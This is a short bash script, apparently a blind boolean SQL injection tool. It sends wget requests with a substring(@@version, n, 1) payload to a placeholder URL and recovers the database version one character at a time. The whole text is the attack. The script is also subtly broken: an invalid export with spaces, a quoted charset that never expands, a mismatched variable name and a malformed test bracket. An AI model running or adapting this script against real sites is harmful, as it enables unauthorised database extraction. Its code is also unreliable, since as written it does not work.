#!/bin/bash

charset='echo {0..9} {A..z} \. \: \, \; \_ \@'

export URL = "vulnerable_URL"
export true_string="string_that_validate_a_true_result"
export maxlenght=$1

export result=""

for ((j=1; j<$maxlenght; j+=1)) 
do
export nthchar=$j
for i in $charset
do
wget "$URL?id=STRING ' and substring(@@version, $nthchar, 1) = '$i" -q -O - | grep "$truestring" &> /dev/null
if ["$?" == "0"]
then
echo Character number $nthchar found: $i
export result+=$i
break
fi
done
done
